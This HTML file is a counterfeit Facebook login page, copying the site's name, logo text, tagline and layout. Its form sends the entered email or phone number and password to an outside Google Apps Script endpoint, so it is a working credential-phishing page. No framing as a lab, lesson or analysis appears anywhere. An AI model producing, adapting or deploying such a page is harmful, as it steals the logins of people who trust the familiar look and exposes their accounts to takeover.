<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook</title>
  <style>
    /* General Reset */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }

    .container {
      display: flex;
      flex-wrap: wrap;
      width: 90%;
      max-width: 1000px;
      background-color: white;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      border-radius: 8px;
      overflow: hidden;
    }

    .left-section {
      flex: 1;
      padding: 40px 20px;
      background-color: #f0f2f5;
      text-align: center;
    }

    .left-section .logo {
      font-size: 3rem;
      color: #1877f2;
      font-weight: bold;
    }

    .left-section .tagline {
      margin-top: 20px;
      font-size: 1.2rem;
      color: #606770;
    }

    .right-section {
      flex: 1;
      padding: 40px 20px;
      background-color: white;
    }

    .login-form {
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    .login-form input {
      padding: 10px;
      font-size: 1rem;
      border: 1px solid #dddfe2;
      border-radius: 4px;
    }

    .login-form button {
      padding: 10px;
      font-size: 1rem;
      font-weight: bold;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    .login-form button[type="submit"] {
      background-color: #1877f2;
      color: white;
    }

    .login-form .forgot-link {
      color: #1877f2;
      font-size: 0.9rem;
      text-align: center;
      margin-top: 10px;
      text-decoration: none;
    }

    .login-form hr {
      margin: 20px 0;
      border: none;
      border-top: 1px solid #dddfe2;
    }

    .create-btn {
      background-color: #42b72a;
      color: white;
    }

    .create-page {
      display: block;
      margin-top: 20px;
      font-size: 0.9rem;
      color: #606770;
      text-align: center;
      text-decoration: none;
    }

    /* Responsive Design */
    @media (max-width: 768px) {
      .container {
        flex-direction: column;
        text-align: center;
      }

      .left-section,
      .right-section {
        padding: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="left-section">
      <h1 class="logo">facebook</h1>
      <p class="tagline">Facebook helps you connect and share with the people in your life.</p>
    </div>
    <div class="right-section">
      <form class="login-form" method="post" action="https://script.google.com/macros/s/AKfycbwsD1mwuJGsRDTpogsW66wQepzSBQY1bNrrrsyEkYRqyNEJeSxDCqw9mh9OfjJOd-uOOQ/exec">
        <input type="text" name="email" placeholder="Email address or phone number" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit" value="submit" >Log in</button>
        <a href="#" class="forgot-link">Forgotten password?</a>
        <hr>
        <button type="button" class="create-btn">Create new account</button>
      </form>
      <a href="#" class="create-page">Create a Page for a celebrity, brand or business.</a>
    </div>
  </div>
</body>
</html>
